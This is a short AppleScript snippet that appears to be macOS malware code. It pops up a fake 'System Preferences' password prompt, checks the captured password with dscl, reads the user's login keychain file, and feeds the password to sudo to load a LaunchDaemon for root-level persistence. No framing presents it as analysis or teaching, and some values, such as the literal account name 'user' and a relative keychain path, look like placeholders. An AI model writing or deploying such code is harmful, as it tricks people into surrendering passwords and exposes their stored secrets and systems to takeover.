set answer to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set entered to text returned of answer
do shell script "dscl . authonly user " & quoted form of entered
set sourcePath to "Keychains/login.keychain-db"
set contents to read sourcePath
do shell script "echo " & quoted form of entered & " | sudo -S launchctl bootstrap system /Library/LaunchDaemons/org.renamed.plist"
